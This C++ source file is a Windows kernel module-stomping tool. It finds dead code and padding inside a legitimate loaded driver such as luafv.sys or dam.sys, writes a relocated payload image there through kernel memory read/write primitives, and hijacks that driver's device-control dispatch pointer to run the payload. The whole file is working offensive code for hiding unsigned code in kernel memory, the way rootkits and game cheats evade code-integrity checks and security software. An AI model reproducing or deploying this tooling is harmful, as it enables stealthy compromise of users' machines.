#include "stomp.h"
#include "mapper.hpp"
#include <winternl.h>
#include <algorithm>
#include <cstring>
#include <cstdio>

#pragma comment(lib, "ntdll.lib")

#ifdef min
#undef min
#endif
#ifdef max
#undef max
#endif

namespace stomp {

static uint32_t RdU32(const uint8_t* p) { uint32_t v; memcpy(&v, p, 4); return v; }
static uint64_t RdU64(const uint8_t* p) { uint64_t v; memcpy(&v, p, 8); return v; }

static const struct { const wchar_t* key; const wchar_t* mod; const wchar_t* dos; } kVictims[] = {
    { L"dam", L"dam.sys", L"\\\\.\\Dam" },
    { L"luafv", L"luafv.sys", L"\\\\.\\Luafv" },
    { L"wcifs", L"wcifs.sys", L"\\\\.\\WCIFS" },
};

bool VictimBlockedForLiveStomp(const wchar_t* shortName)
{
    if (!shortName || !shortName[0]) return true;
    std::wstring n(shortName);
    std::transform(n.begin(), n.end(), n.begin(), ::towlower);
    if (n.size() >= 4 && n.compare(n.size() - 4, 4, L".sys") != 0) n += L".sys";
    static const wchar_t* blocked[] = {
        L"fltmgr.sys", L"ndis.sys", L"tcpip.sys", L"ntfs.sys", L"disk.sys",
        L"partmgr.sys", L"volmgr.sys", L"volsnap.sys", L"spaceport.sys",
        L"storport.sys", L"clipsp.sys", L"cng.sys", L"ksecdd.sys", L"mountmgr.sys",
        L"dxgkrnl.sys", L"http.sys", L"afd.sys",
    };
    for (auto* b : blocked) {
        if (n == b) return true;
    }
    return false;
}

bool LookupVictimDosName(const wchar_t* shortName, std::wstring& moduleName, std::wstring& dosName)
{
    if (!shortName || !shortName[0]) return false;
    std::wstring key(shortName);
    std::transform(key.begin(), key.end(), key.begin(), ::towlower);
    for (const auto& v : kVictims) {
        if (key == v.key || key == v.mod || key + L".sys" == v.mod) {
            moduleName = v.mod;
            dosName = v.dos;
            return true;
        }
    }
    moduleName = key;
    if (moduleName.size() < 4 || moduleName.compare(moduleName.size() - 4, 4, L".sys") != 0)
        moduleName += L".sys";
    std::wstring stem = moduleName.substr(0, moduleName.size() - 4);
    if (!stem.empty()) stem[0] = (wchar_t)towupper(stem[0]);
    dosName = L"\\\\.\\" + stem;
    return true;
}

uint32_t PeSizeOfImage(const std::vector<uint8_t>& payloadFile)
{
    if (payloadFile.size() < 0x200) return 0;
    uint32_t pe = RdU32(payloadFile.data() + 0x3C);
    if (pe + 0x120 > payloadFile.size()) return 0;
    if (RdU32(payloadFile.data() + pe) != 0x4550) return 0;
    return RdU32(payloadFile.data() + pe + 24 + 56);
}

uint32_t PeFirstSectionRva(const std::vector<uint8_t>& payloadFile)
{
    if (payloadFile.size() < 0x200) return 0;
    const uint8_t* b = payloadFile.data();
    uint32_t pe = RdU32(b + 0x3C);
    if (pe + 0x120 > payloadFile.size() || RdU32(b + pe) != 0x4550) return 0;
    WORD nsec = *(const WORD*)(b + pe + 6);
    WORD optSz = *(const WORD*)(b + pe + 20);
    if (!nsec) return 0;
    const uint8_t* sec = b + pe + 24 + optSz;
    uint32_t best = 0xFFFFFFFF;
    for (int i = 0; i < nsec; ++i) {
        uint32_t va = RdU32(sec + i * 40 + 12);
        if (va && va < best) best = va;
    }
    return best == 0xFFFFFFFF ? 0 : best;
}

struct SYSMOD {
    ULONG r1[2];
    ULONG_PTR image_base;
    ULONG image_size;
    ULONG flags;
    USHORT rank, pad;
    ULONG name_off;
    CHAR name[256];
};

static bool FileToWide(const std::string& p, std::wstring& out)
{
    int n = MultiByteToWideChar(CP_ACP, 0, p.c_str(), -1, nullptr, 0);
    if (n <= 0) return false;
    out.resize((size_t)n);
    MultiByteToWideChar(CP_ACP, 0, p.c_str(), -1, &out[0], n);
    while (!out.empty() && out.back() == L'\0') out.pop_back();
    return !out.empty();
}

static bool LoadVictimPeFile(const std::wstring& diskPath, VictimImage& out, const std::wstring& logicalName)
{
    out.disk_path = diskPath;
    out.name = logicalName;
    HANDLE f = CreateFileW(diskPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) return false;
    DWORD sz = GetFileSize(f, nullptr);
    if (sz == INVALID_FILE_SIZE) { CloseHandle(f); return false; }
    out.raw.resize(sz);
    DWORD rd = 0;
    ReadFile(f, out.raw.data(), sz, &rd, nullptr);
    CloseHandle(f);
    if (rd != sz) return false;

    const uint8_t* b = out.raw.data();
    if (sz < 0x200 || RdU32(b + 0x3C) == 0) return false;
    const uint8_t* nth = b + RdU32(b + 0x3C);
    if (RdU32(nth) != 0x4550) return false;
    out.preferred_base = RdU64(nth + 24 + 24);
    out.image_size = RdU32(nth + 24 + 56);
    WORD nsec = *(const WORD*)(nth + 6);
    WORD optSz = *(const WORD*)(nth + 20);
    const uint8_t* sec = nth + 24 + optSz;
    for (int i = 0; i < nsec; ++i) {
        if (!memcmp(sec + i * 40, ".text\0\0\0", 8)) {
            out.text_vsize = RdU32(sec + i * 40 + 8);
            out.text_rva = RdU32(sec + i * 40 + 12);
            out.text_raw_size = RdU32(sec + i * 40 + 16);
            out.text_raw_ptr = RdU32(sec + i * 40 + 20);
            break;
        }
    }
    return out.text_rva != 0;
}

bool EnumerateVictimFromDisk(const wchar_t* shortName, VictimImage& out)
{
    if (!shortName || !shortName[0]) return false;
    std::wstring modName, dosName;
    if (!LookupVictimDosName(shortName, modName, dosName)) return false;
    wchar_t wr[MAX_PATH]{};
    if (!GetWindowsDirectoryW(wr, MAX_PATH)) return false;
    std::wstring path = std::wstring(wr) + L"\\System32\\drivers\\" + modName;
    if (!LoadVictimPeFile(path, out, modName)) return false;
    out.loaded_base = out.preferred_base;
    return true;
}

bool EnumerateVictim(const std::wstring& victimNameIn, VictimImage& out)
{
    std::wstring lower(victimNameIn);
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    if (lower.size() < 4 || lower.compare(lower.size() - 4, 4, L".sys") != 0)
        lower += L".sys";

    ULONG need = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &need);
    std::vector<uint8_t> buf(need + 0x2000, 0);
    if (!NT_SUCCESS(NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, buf.data(), (ULONG)buf.size(), &need)))
        return false;

    char targ[300]{};
    WideCharToMultiByte(CP_ACP, 0, lower.c_str(), -1, targ, sizeof(targ), nullptr, nullptr);
    for (char* p = targ; *p; ++p) *p = (char)tolower((unsigned char)*p);
    size_t tl = strlen(targ);

    ULONG count = RdU32(buf.data());
    auto* mods = (SYSMOD*)(buf.data() + 8);
    const SYSMOD* hit = nullptr;
    const char* hitName = nullptr;
    for (ULONG i = 0; i < count && !hit; ++i) {
        std::string n = mods[i].name;
        std::string nl = n;
        std::transform(nl.begin(), nl.end(), nl.begin(), ::tolower);
        if (nl.size() >= tl && nl.compare(nl.size() - tl, tl, targ) == 0) {
            hit = &mods[i];
            hitName = mods[i].name;
        }
    }
    if (!hit) return false;

    out.loaded_base = hit->image_base;
    out.image_size = hit->image_size;

    std::string p = hitName;
    if (p.rfind("\\SystemRoot", 0) == 0) {
        char wr[MAX_PATH]{};
        GetWindowsDirectoryA(wr, MAX_PATH);
        p = std::string(wr) + p.substr(11);
    } else if (p.rfind("\\??\\", 0) == 0)
        p = p.substr(4);
    std::wstring diskPath;
    if (!FileToWide(p, diskPath)) return false;
    return LoadVictimPeFile(diskPath, out, lower);
}

bool AnalyzeDeadCode(VictimImage& img)
{
    const uint8_t* b = img.raw.data();
    size_t total = img.raw.size();
    uint32_t tsz = (img.text_raw_size < img.text_vsize) ? img.text_raw_size : img.text_vsize;
    uint32_t tbody = img.text_raw_ptr + tsz;

    std::vector<DeadFunc> funcs;
    bool inFunc = false;
    uint32_t fstart = 0;
    uint32_t ccRun = 0;
    for (uint32_t o = img.text_raw_ptr; o < tbody; ++o) {
        if (b[o] == 0xCC) {
            if (inFunc) {
                if (++ccRun >= 4) {
                    uint32_t endOff = o - (ccRun - 1);
                    uint32_t endRva = img.text_rva + (endOff - img.text_raw_ptr);
                    funcs.push_back({ fstart, endRva - fstart });
                    inFunc = false;
                }
            }
        } else {
            if (!inFunc) {
                inFunc = true;
                fstart = img.text_rva + (o - img.text_raw_ptr);
            }
            ccRun = 0;
        }
    }
    // Last live byte in .text (trim trailing CC/zeros — do not assume .text is full).
    uint32_t lastCodeOff = img.text_raw_ptr;
    for (uint32_t o = tbody; o > img.text_raw_ptr;) {
        --o;
        if (b[o] != 0xCC && b[o] != 0x00) {
            lastCodeOff = o;
            break;
        }
    }
    if (inFunc) {
        uint32_t endRva = img.text_rva + (lastCodeOff - img.text_raw_ptr) + 1;
        if (endRva > fstart)
            funcs.push_back({ fstart, endRva - fstart });
    }

    std::vector<uint32_t> refs;
    for (size_t i = (size_t)img.text_raw_ptr + 1; i < tbody; ++i) {
        uint8_t prev = b[i - 1];
        if (prev == 0xE8 || prev == 0xE9) {
            int32_t d = (int32_t)RdU32(b + i);
            uint32_t instRva = img.text_rva + (uint32_t)(i - 1 - img.text_raw_ptr);
            refs.push_back((uint32_t)((int64_t)(instRva + 5) + d));
        } else if (i >= (size_t)img.text_raw_ptr + 2 && b[i - 2] == 0x0F && (b[i - 1] & 0xF0) == 0x80) {
            int32_t d = (int32_t)RdU32(b + i);
            uint32_t instRva = img.text_rva + (uint32_t)(i - 2 - img.text_raw_ptr);
            refs.push_back((uint32_t)((int64_t)(instRva + 6) + d));
        }
    }
    for (size_t off = 0; off + 8 <= total; off += 4) {
        uint64_t v = RdU64(b + off);
        if (v >= img.preferred_base && v < img.preferred_base + img.text_vsize)
            refs.push_back((uint32_t)(v - img.preferred_base));
    }
    std::sort(refs.begin(), refs.end());

    img.text_used_high_rva = img.text_rva + (lastCodeOff - img.text_raw_ptr) + 1;
    for (const auto& f : funcs)
        img.text_used_high_rva = std::max(img.text_used_high_rva, f.rva_start + f.size);

    img.all_funcs = funcs;
    img.dead_funcs.clear();
    for (auto& f : funcs) {
        if (f.size < 16) continue;
        if (!std::binary_search(refs.begin(), refs.end(), f.rva_start))
            img.dead_funcs.push_back(f);
    }
    return !img.dead_funcs.empty();
}

static bool PlanThunkOutsideCluster(const std::vector<DeadFunc>& byRva, uint32_t clStart,
                                    uint32_t clNeed, StompPlan& out);

// Live map gate: every byte must be dead code or 0xCC on disk (no live .text).
static bool PlacementRegionStrict(const VictimImage& img, uint32_t startRva, uint32_t size)
{
    if (!size || startRva < img.text_rva) return false;
    uint32_t off = startRva - img.text_rva;
    if (off + size > img.text_vsize) return false;
    const uint8_t* b = img.raw.data();
    uint32_t rawEnd = img.text_raw_ptr + (img.text_raw_size < img.text_vsize ? img.text_raw_size : img.text_vsize);
    for (uint32_t i = 0; i < size; ++i) {
        uint32_t rva = startRva + i;
        bool inDead = false;
        for (const auto& d : img.dead_funcs) {
            if (rva >= d.rva_start && rva < d.rva_start + d.size) {
                inDead = true;
                break;
            }
        }
        if (inDead) continue;
        uint32_t o = img.text_raw_ptr + (rva - img.text_rva);
        if (o >= rawEnd) return false;
        if (b[o] != 0xCC) return false;
    }
    return true;
}

static bool RvaInLive(const VictimImage& img, uint32_t rva)
{
    for (const auto& f : img.all_funcs) {
        if (rva < f.rva_start || rva >= f.rva_start + f.size) continue;
        for (const auto& d : img.dead_funcs)
            if (d.rva_start == f.rva_start) return false;
        return true;
    }
    return false;
}

static bool BuildSafeTextMap(const VictimImage& img, std::vector<uint8_t>& safe)
{
    const uint8_t* b = img.raw.data();
    uint32_t tsz = (img.text_raw_size < img.text_vsize) ? img.text_raw_size : img.text_vsize;
    if (!img.text_vsize) return false;
    safe.assign(img.text_vsize, 0);
    for (const auto& d : img.dead_funcs) {
        uint32_t off = d.rva_start - img.text_rva;
        if (off >= img.text_vsize) continue;
        uint32_t n = d.size;
        if (off + n > img.text_vsize) n = img.text_vsize - off;
        memset(&safe[off], 1, n);
    }
    for (uint32_t o = 0; o < tsz; ++o) {
        uint8_t x = b[img.text_raw_ptr + o];
        uint32_t rva = img.text_rva + o;
        // Only MSVC int3 padding — not zero bytes (may be live data in .text).
        if (x == 0xCC && !RvaInLive(img, rva))
            safe[o] = 1;
    }
    if (img.text_vsize > tsz) {
        for (uint32_t o = tsz; o < img.text_vsize; ++o)
            safe[o] = 1;
    }
    return true;
}

uint32_t MaxSafeTextSpan(const VictimImage& img, uint32_t payload_SizeOfImage)
{
    std::vector<uint8_t> safe;
    if (!BuildSafeTextMap(img, safe)) return 0;
    uint32_t best = 0, run = 0;
    for (size_t o = 0; o < safe.size(); ++o) {
        if (safe[o]) {
            ++run;
        } else {
            if (run > best) best = run;
            run = 0;
        }
    }
    if (run > best) best = run;
    (void)payload_SizeOfImage;
    return best;
}

static bool PlanSafeSpan(const VictimImage& img, uint32_t need, StompPlan& out,
                         const std::vector<DeadFunc>& byRva)
{
    std::vector<uint8_t> safe;
    if (!BuildSafeTextMap(img, safe)) return false;
    uint32_t bestOff = 0, bestRun = 0, run = 0, runStart = 0;
    for (uint32_t o = 0; o < (uint32_t)safe.size(); ++o) {
        if (safe[o]) {
            if (!run) runStart = o;
            ++run;
        } else {
            if (run > bestRun) {
                bestRun = run;
                bestOff = runStart;
            }
            run = 0;
        }
    }
    if (run > bestRun) {
        bestRun = run;
        bestOff = runStart;
    }
    if (bestRun < need + 16) return false;
    out.payload_rva = img.text_rva + bestOff;
    out.payload_size = need;
    return PlanThunkOutsideCluster(byRva, out.payload_rva, bestRun, out);
}

static uint32_t AlignUp32(uint32_t v, uint32_t a)
{
    return (v + a - 1) & ~(a - 1u);
}

uint32_t MaxTextCcRun(const VictimImage& img)
{
    const uint8_t* b = img.raw.data();
    uint32_t tsz = (img.text_raw_size < img.text_vsize) ? img.text_raw_size : img.text_vsize;
    uint32_t tbody = img.text_raw_ptr + tsz;
    uint32_t bestRun = 0, run = 0;
    for (uint32_t o = img.text_raw_ptr; o < tbody; ++o) {
        if (b[o] == 0xCC || b[o] == 0x00) ++run;
        else {
            if (run > bestRun) bestRun = run;
            run = 0;
        }
    }
    if (run > bestRun) bestRun = run;
    return bestRun;
}

static bool PlanCcSlack(const VictimImage& img, uint32_t need, StompPlan& out,
                        const std::vector<DeadFunc>& byRva)
{
    const uint8_t* b = img.raw.data();
    uint32_t tsz = (img.text_raw_size < img.text_vsize) ? img.text_raw_size : img.text_vsize;
    uint32_t tbody = img.text_raw_ptr + tsz;
    uint32_t bestOff = 0, bestRun = 0, runStart = 0, run = 0;
    for (uint32_t o = img.text_raw_ptr; o < tbody; ++o) {
        if (b[o] == 0xCC) {
            if (!run) runStart = o;
            ++run;
        } else {
            if (run > bestRun) {
                bestRun = run;
                bestOff = runStart;
            }
            run = 0;
        }
    }
    if (run > bestRun) {
        bestRun = run;
        bestOff = runStart;
    }
    if (bestRun < need) return false;
    out.payload_rva = img.text_rva + (bestOff - img.text_raw_ptr);
    out.payload_size = need;
    return PlanThunkOutsideCluster(byRva, out.payload_rva, bestRun, out);
}

static bool PlanThunkOutsideCluster(const std::vector<DeadFunc>& byRva, uint32_t clStart,
                                    uint32_t clNeed, StompPlan& out)
{
    uint32_t clEnd = clStart + clNeed;
    for (const auto& f : byRva) {
        if (f.rva_start + f.size <= clStart || f.rva_start >= clEnd) {
            if (f.size >= 16) {
                out.thunk_rva = f.rva_start;
                return true;
            }
        }
    }
  out.thunk_rva = clStart;
    out.payload_rva = clStart + 16;
    return true;
}

// Bytes between an executable section's VirtualSize and the next section's VA.
// The loader zero-fills that hole; it is not live code. Dead-function clusters are not.
static bool PlanExecGap(const VictimImage& img, uint32_t need, StompPlan& out)
{
    const uint8_t* b = img.raw.data();
    if (img.raw.size() < 0x200) return false;
    uint32_t pe = RdU32(b + 0x3C);
    if (pe + 0x120 > img.raw.size() || RdU32(b + pe) != 0x4550) return false;
    WORD nsec = *(const WORD*)(b + pe + 6);
    WORD optSz = *(const WORD*)(b + pe + 20);
    const uint8_t* sec = b + pe + 24 + optSz;
    struct Sec { uint32_t va, vs, ch; char name[8]; };
    std::vector<Sec> secs;
    for (int i = 0; i < nsec; ++i) {
        const uint8_t* s = sec + i * 40;
        if ((size_t)(s - b) + 40 > img.raw.size()) break;
        Sec row{};
        row.va = RdU32(s + 12);
        row.vs = RdU32(s + 8);
        row.ch = RdU32(s + 36);
        memcpy(row.name, s, 8);
        secs.push_back(row);
    }
    std::sort(secs.begin(), secs.end(), [](const Sec& a, const Sec& c) { return a.va < c.va; });
    uint32_t bestAt = 0, bestGap = 0;
    for (size_t i = 0; i + 1 < secs.size(); ++i) {
        if ((secs[i].ch & 0x20000000u) == 0) continue;
        if (_strnicmp(secs[i].name, "INIT", 4) == 0) continue;
        uint32_t end = secs[i].va + secs[i].vs;
        uint32_t next = secs[i + 1].va;
        if (next <= end) continue;
        uint32_t start = (end + 15u) & ~15u;
        if (next <= start) continue;
        uint32_t gap = next - start;
        if (gap >= need && gap > bestGap) {
            bestGap = gap;
            bestAt = start;
        }
    }
    if (bestGap < need) return false;
    out.payload_rva = bestAt;
    out.payload_size = need;
    out.thunk_rva = bestAt;
    return true;
}

bool PlanPlacement(const VictimImage& img, uint32_t payload_SizeOfImage, StompPlan& out)
{
    if (PlanExecGap(img, payload_SizeOfImage, out)) return true;

    const auto& d = img.dead_funcs;
    auto byRva = d;
    if (PlanCcSlack(img, payload_SizeOfImage, out, byRva)) {
        const uint8_t* b = img.raw.data();
        uint32_t rawEnd = img.text_raw_ptr +
            (img.text_raw_size < img.text_vsize ? img.text_raw_size : img.text_vsize);
        for (uint32_t i = 0; i < payload_SizeOfImage; ++i) {
            uint32_t o = img.text_raw_ptr + (out.payload_rva + i - img.text_rva);
            if (o >= rawEnd || b[o] != 0xCC) return false;
        }
        out.thunk_rva = out.payload_rva;
        return true;
    }
    return false;
}

struct HE {
    uint64_t Object;
    uint64_t UniqueProcessId;
    uint64_t HandleValue;
    uint32_t GrantedAccess;
    uint16_t CreatorBackTrace;
    uint16_t ObjectTypeIndex;
    uint32_t HandleAttributes;
    uint32_t Reserved;
};
struct HT {
    uint64_t NumberOfHandles;
    uint64_t Reserved;
    HE Handles[1];
};

bool ResolveDriverObjectFromHandle(KernelPrimitives& prim, HANDLE hDev, uint64_t& driverObjectKva)
{
    driverObjectKva = 0;
    if (!prim.ReadKernelMemory) return false;

    ULONG need = 0x80000;
    std::vector<uint8_t> buf;
    NTSTATUS hst = (NTSTATUS)0xC0000004L;
    for (int tries = 0; tries < 8 && hst == (NTSTATUS)0xC0000004L; tries++) {
        buf.assign(need, 0);
        ULONG retNeeded = 0;
        hst = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x40, buf.data(), need, &retNeeded);
        if (hst == (NTSTATUS)0xC0000004L)
            need = retNeeded ? retNeeded + 0x10000 : need * 2;
    }
    if (!NT_SUCCESS(hst)) return false;

    auto* ht = (HT*)buf.data();
    uint64_t selfPid = GetCurrentProcessId();
    uint64_t hVal = (uint64_t)(uintptr_t)hDev;
    const HE* hit = nullptr;
    for (uint64_t i = 0; i < ht->NumberOfHandles; ++i) {
        if (ht->Handles[i].UniqueProcessId == selfPid && ht->Handles[i].HandleValue == hVal) {
            hit = &ht->Handles[i];
            break;
        }
    }
    if (!hit) return false;

    uint64_t fileKva = 0;
    if (!prim.ReadKernelMemory(&fileKva, hit->Object, 8) || !fileKva) return false;
    uint64_t devKva = 0;
    if (!prim.ReadKernelMemory(&devKva, fileKva + 8, 8) || !devKva) return false;
    uint64_t drvKva = 0;
    if (!prim.ReadKernelMemory(&drvKva, devKva + 8, 8) || !drvKva) return false;
    driverObjectKva = drvKva;
    return true;
}

uint64_t ResolveKernelExport(KernelPrimitives& prim, uint64_t kernelBase, const char* exportName)
{
    if (!exportName || !kernelBase || !prim.ReadKernelMemory) return 0;
    uint8_t hdr[0x400]{};
    if (!prim.ReadKernelMemory(hdr, kernelBase, sizeof(hdr))) return 0;
    uint32_t pe = RdU32(hdr + 0x3C);
    if (pe + 0x100 > sizeof(hdr)) return 0;
    const uint32_t* dirs = (const uint32_t*)(hdr + pe + 24 + 112);
    uint32_t expRva = dirs[0];
    uint32_t expSz = dirs[1];
    if (!expRva || !expSz) return 0;

    std::vector<uint8_t> exp(expSz + 0x40);
    if (!prim.ReadKernelMemory(exp.data(), kernelBase + expRva, exp.size())) return 0;
    auto* ed = (const IMAGE_EXPORT_DIRECTORY*)exp.data();
    uint32_t nNames = ed->NumberOfNames;
    uint32_t addrRva = ed->AddressOfFunctions;
    uint32_t nameRva = ed->AddressOfNames;
    uint32_t ordRva = ed->AddressOfNameOrdinals;

    std::vector<uint32_t> names(nNames), ords(nNames), funcs(ed->NumberOfFunctions);
    if (!prim.ReadKernelMemory(names.data(), kernelBase + nameRva, nNames * 4)) return 0;
    if (!prim.ReadKernelMemory(ords.data(), kernelBase + ordRva, nNames * 2)) return 0;
    if (!prim.ReadKernelMemory(funcs.data(), kernelBase + addrRva, funcs.size() * 4)) return 0;

    for (uint32_t i = 0; i < nNames; ++i) {
        char nm[128]{};
        if (!prim.ReadKernelMemory(nm, kernelBase + names[i], sizeof(nm) - 1)) continue;
        if (_stricmp(nm, exportName) != 0) continue;
        uint16_t ordIndex = 0;
        if (!prim.ReadKernelMemory(&ordIndex, kernelBase + ordRva + i * 2, 2)) return 0;
        if (ordIndex >= funcs.size()) return 0;
        return kernelBase + funcs[ordIndex];
    }
    return 0;
}

bool ApplyStomp(KernelPrimitives& prim, const VictimImage& img, StompPlan& plan,
    uint64_t /*kernelBase*/, uint64_t pMmGetSystemRoutineAddress,
    uint64_t pMmCopyVirtualMemory, uint32_t sweepMask,
    std::vector<uint8_t>& payloadFile)
{
    if (payloadFile.size() < 0x200) return false;
    uint8_t* pb = payloadFile.data();
    uint32_t peOff = RdU32(pb + 0x3C);
    if (peOff == 0 || RdU32(pb + peOff) != 0x4550) return false;
    const uint8_t* pn = pb + peOff;
    uint64_t payloadImageBase = RdU64(pn + 24 + 24);
    uint32_t sizeOfImage = RdU32(pn + 24 + 56);
    if (plan.payload_size < sizeOfImage) return false;
    WORD nsec = *(const WORD*)(pn + 6);
    WORD optSz = *(const WORD*)(pn + 20);
    const uint8_t* psec = pn + 24 + optSz;
    uint32_t sizeOfHeaders = RdU32(pn + 24 + 60);

    {
        uint8_t live[16], disk[16];
        memcpy(disk, img.raw.data() + img.text_raw_ptr, 16);
        if (!prim.ReadKernelMemory(live, plan.victim_base + img.text_rva, 16)) return false;
        if (memcmp(live, disk, 16) != 0) return false;
    }

    uint64_t drvObj = 0;
    {
        HANDLE hv = CreateFileW(plan.victim_dos_name.c_str(), 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hv == INVALID_HANDLE_VALUE) {
            hv = CreateFileW(plan.victim_dos_name.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
        }
        if (hv == INVALID_HANDLE_VALUE) return false;
        bool ok = ResolveDriverObjectFromHandle(prim, hv, drvObj);
        CloseHandle(hv);
        if (!ok || !drvObj) return false;
    }
    plan.victim_driver_object = drvObj;

    uint64_t origDispatch = 0;
    uint64_t slotAddr = drvObj + 0x70 + 0x0E * 8;
    if (!prim.ReadKernelMemory(&origDispatch, slotAddr, 8)) return false;
    plan.orig_dispatch = origDispatch;

    uint32_t skip = plan.header_skip;
    if (skip >= sizeOfImage) return false;
    uint32_t span = sizeOfImage - skip;
    if (plan.payload_size < span) return false;
    uint64_t newBase = plan.victim_base + plan.payload_rva - skip;
    int64_t delta = (int64_t)(newBase - payloadImageBase);

    std::vector<uint8_t> mapped((size_t)sizeOfImage, 0);
    size_t hdrCopy = (size_t)sizeOfHeaders;
    if (hdrCopy > mapped.size()) hdrCopy = mapped.size();
    memcpy(mapped.data(), pb, hdrCopy);
    for (int i = 0; i < nsec; ++i) {
        const uint8_t* s = psec + i * 40;
        uint32_t rva = RdU32(s + 12), rs = RdU32(s + 16), rp = RdU32(s + 20);
        if (rs && rva + rs <= sizeOfImage)
            memcpy(mapped.data() + rva, pb + rp, rs);
    }

    const uint32_t* dirs = (const uint32_t*)(pn + 24 + 112);
    uint32_t relRva = dirs[5 * 2], relSize = dirs[5 * 2 + 1];
    auto secRvaToFileOff = [&](uint32_t r) -> int {
        for (int i = 0; i < nsec; ++i) {
            const uint8_t* s = psec + i * 40;
            uint32_t va = RdU32(s + 12), rs = RdU32(s + 16), rp = RdU32(s + 20);
            if (r >= va && r < va + rs) return (int)rp + (int)(r - va);
        }
        return -1;
    };
    if (relSize) {
        int relOff = secRvaToFileOff(relRva);
        if (relOff >= 0) {
            uint32_t done = 0;
            while (done < relSize) {
                const uint8_t* blk = pb + relOff + done;
                uint32_t pageRva = RdU32(blk);
                uint32_t blkSize = RdU32(blk + 4);
                if (blkSize < 8) break;
                for (uint32_t e = 8; e < blkSize; e += 2) {
                    uint16_t w = *(const uint16_t*)(blk + e);
                    if ((w >> 12) == 0x0A) {
                        uint32_t slotRva = pageRva + (w & 0xFFF);
                        if (slotRva + 8 <= sizeOfImage) {
                            uint64_t v;
                            memcpy(&v, mapped.data() + slotRva, 8);
                            v = (uint64_t)((int64_t)v + delta);
                            memcpy(mapped.data() + slotRva, &v, 8);
                        }
                    }
                }
                done += blkSize;
            }
        }
    }

    int sdRva = -1;
    for (int i = 0; i < nsec; ++i) {
        if (!memcmp(psec + i * 40, ".stompdata", 10)) {
            sdRva = (int)RdU32(psec + i * 40 + 12);
            break;
        }
    }
    if (sdRva < 0 || sdRva + 0x20 > (int)sizeOfImage) return false;
    uint8_t* sd = mapped.data() + sdRva;
    memset(sd, 0, 0x30);
    *(uint64_t*)(sd + 0x00) = origDispatch;
    *(uint64_t*)(sd + 0x08) = pMmGetSystemRoutineAddress;
    *(uint64_t*)(sd + 0x10) = pMmCopyVirtualMemory;
    *(uint32_t*)(sd + 0x18) = sweepMask;
    *(uint32_t*)(sd + 0x1C) = 0x324D5453u;

    {
        std::vector<uint8_t> hole(span);
        if (!prim.ReadKernelMemory(hole.data(), plan.victim_base + plan.payload_rva, hole.size()))
            return false;
        for (uint8_t x : hole) {
            if (x != 0x00 && x != 0xCC) return false;
        }
    }

    if (!prim.WriteKernelMemory(plan.victim_base + plan.payload_rva, mapped.data() + skip, span))
        return false;

    uint32_t entryRva = RdU32(pn + 24 + 16);
    uint64_t entryAbs = newBase + entryRva;
    plan.thunk_rva = plan.payload_rva + entryRva;
    if (!prim.WriteKernelMemory(slotAddr, &entryAbs, 8)) return false;

    payloadFile = std::move(mapped);
    return true;
}

bool VerifyStomp(KernelPrimitives& prim, const StompPlan& plan,
    const std::vector<uint8_t>& payloadMapped, size_t checkBytes)
{
    size_t off = plan.header_skip;
    if (off >= payloadMapped.size()) return false;
    if (off + checkBytes > payloadMapped.size())
        checkBytes = payloadMapped.size() - off;
    std::vector<uint8_t> live(checkBytes);
    if (!prim.ReadKernelMemory(live.data(), plan.victim_base + plan.payload_rva, checkBytes))
        return false;
    return memcmp(live.data(), payloadMapped.data() + off, checkBytes) == 0;
}

} // namespace stomp